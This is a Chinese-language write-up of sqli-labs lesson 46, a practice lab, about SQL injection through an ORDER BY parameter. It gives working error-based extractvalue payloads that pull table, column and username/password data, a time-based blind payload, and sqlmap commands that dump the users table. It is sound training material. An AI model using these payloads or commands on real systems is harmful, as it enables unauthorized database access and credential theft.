---
title: sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入
date: 2018-11-04 17:21:03
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入

---

## 登录界面

![001](/img/sql/Lesson-46/001.png)

## 分析

本关的sql语句就是下面的了

`$sql = "SELECT * FROM users ORDER BY $id";`

```
order by 可以加字段名，表达式和字段的位置，字段的位置需要是整数型。不可以跟union。
ORDER BY {col_name | expr | position} 
```

order在之前是用来判断列数的,这里照样。

![002](/img/sql/Lesson-46/002.png)

![003](/img/sql/Lesson-46/003.png)

数字型的当输入正常的列数时会根据列进行排序。

![004](/img/sql/Lesson-46/004.png)

## 注入过程

### 判断字符型

通过desc或者asc排序判断。

![005](/img/sql/Lesson-46/005.png)

判断为数字型

### 报错注入



本课是有报错的,可以利用报错注入

`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))`

![006](/img/sql/Lesson-46/006.png)

`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e))`

![007](/img/sql/Lesson-46/007.png)

`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e))`

![008](/img/sql/Lesson-46/008.png)

`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password) from security.users limit 0,1),0x7e))`

![009](/img/sql/Lesson-46/009.png)

### 时间盲注

payload:

`10.60.250.60/sql/Less-46/?sort=1 and if(1=2, sleep(1), null)`

## SQLMAP

`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E `

![010](/img/sql/Lesson-46/010.png)

![011](/img/sql/Lesson-46/011.png)

`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E --dbs`



![012](/img/sql/Lesson-46/012.png)

`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security --tables`

![013](/img/sql/Lesson-46/013.png)

`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security -T users --columns --dump`

![014](/img/sql/Lesson-46/014.png)

